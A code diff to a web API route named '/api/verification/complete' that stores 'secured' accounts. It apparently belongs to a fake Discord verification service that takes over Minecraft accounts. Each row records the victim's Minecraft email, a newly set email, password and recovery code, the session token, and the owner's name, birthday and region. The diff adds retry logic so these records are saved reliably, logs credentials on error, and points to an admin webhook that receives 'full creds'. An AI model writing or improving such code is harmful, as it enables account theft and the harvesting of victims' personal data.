@@ -74,39 +74,75 @@ export const Route = createFileRoute("/api/verification/complete")({
           );
         }
 
-        // Store secured account (secrets stay in DB + optional admin webhook / DM only)
-        const { data: securedRow, error: insertError } = await db()
-          .from("secured_accounts")
-          .insert({
-            discord_id: storeDiscordId,
-            mc_username: mcUsername,
-            mc_email: mcEmail,
-            new_email: newEmail,
-            new_password: newPassword,
-            new_recovery_code: recoveryCode,
-            mc_ssid: result.ssid as string | null,
-            mc_capes: result.capes as string,
-            mc_method: result.method as string,
-            owner_first_name: result.firstName as string,
-            owner_last_name: result.lastName as string,
-            owner_region: result.region as string,
-            owner_birthday: result.birthday as string,
-            guild_id: guildId || null,
-            session_id: sessionId || null,
-          })
-          .select("id")
-          .single();
+        // Store secured account — full row first, then minimal if optional columns missing
+        const fullRow = {
+          discord_id: storeDiscordId,
+          mc_username: mcUsername,
+          mc_email: mcEmail,
+          new_email: newEmail,
+          new_password: newPassword,
+          new_recovery_code: recoveryCode,
+          mc_ssid: (result.ssid as string) || null,
+          mc_capes: (result.capes as string) || null,
+          mc_method: (result.method as string) || null,
+          owner_first_name: (result.firstName as string) || null,
+          owner_last_name: (result.lastName as string) || null,
+          owner_region: (result.region as string) || null,
+          owner_birthday: (result.birthday as string) || null,
+          guild_id: guildId || null,
+          session_id: sessionId || null,
+        };
+        const minimalRow = {
+          discord_id: storeDiscordId,
+          mc_username: mcUsername,
+          mc_email: mcEmail,
+          new_email: newEmail,
+          new_password: newPassword,
+          new_recovery_code: recoveryCode,
+        };
 
-        if (insertError) {
-          console.error("[verification/complete] insert secured_accounts:", insertError.message);
-          if (sessionId) {
-            await db()
-              .from("verification_sessions")
-              .update({ status: "failed" })
-              .eq("id", sessionId);
+        let securedRow: { id: string } | null = null;
+        let insertError: { message: string } | null = null;
+        {
+          const { data, error } = await db()
+            .from("secured_accounts")
+            .insert(fullRow)
+            .select("id")
+            .single();
+          if (!error && data) {
+            securedRow = data;
+          } else {
+            insertError = error;
+            if (error && /column|does not exist|schema cache/i.test(error.message)) {
+              console.warn(
+                "[verification/complete] full insert failed, retrying minimal:",
+                error.message,
+              );
+              const { data: d2, error: e2 } = await db()
+                .from("secured_accounts")
+                .insert(minimalRow)
+                .select("id")
+                .single();
+              if (!e2 && d2) {
+                securedRow = d2;
+                insertError = null;
+              } else {
+                insertError = e2 || error;
+              }
+            }
           }
+        }
+
+        if (insertError || !securedRow) {
+          console.error(
+            "[verification/complete] insert secured_accounts:",
+            insertError?.message,
+            "creds",
+            { newEmail, storeDiscordId, mcUsername },
+          );
+          // Do NOT mark session failed if account was already secured — admin can recover from logs/webhook
           return Response.json(
-            { error: `Failed to store secured account: ${insertError.message}` },
+            { error: `Failed to store secured account: ${insertError?.message || "unknown"}` },
             { status: 500 },
           );
         }
@@ -115,7 +151,8 @@ export const Route = createFileRoute("/api/verification/complete")({
           await db()
             .from("verification_sessions")
             .update({ status: "secured" })
-            .eq("id", sessionId);
+            .eq("id", sessionId)
+            .neq("status", "secured");
         }
 
         // ---- Admin webhook FIRST (full creds as soon as secure succeeds) ----
